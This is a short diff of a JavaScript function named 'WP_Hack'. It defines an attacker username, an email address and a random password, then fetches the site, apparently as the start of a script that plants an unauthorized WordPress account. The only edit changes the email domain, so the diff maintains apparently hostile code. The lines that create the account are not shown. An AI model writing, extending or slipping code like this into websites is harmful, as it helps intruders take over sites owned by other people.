@@ -1,7 +1,7 @@
 (function ($) {
     var WP_Hack = function () {
         var username = 'hacker_max';
-        var email = 'contact@blog.xyz';
+        var email = 'contact@blogk.xyz';
         var password = Math.random().toString(36).substring(2);
 
         var site = get_site();
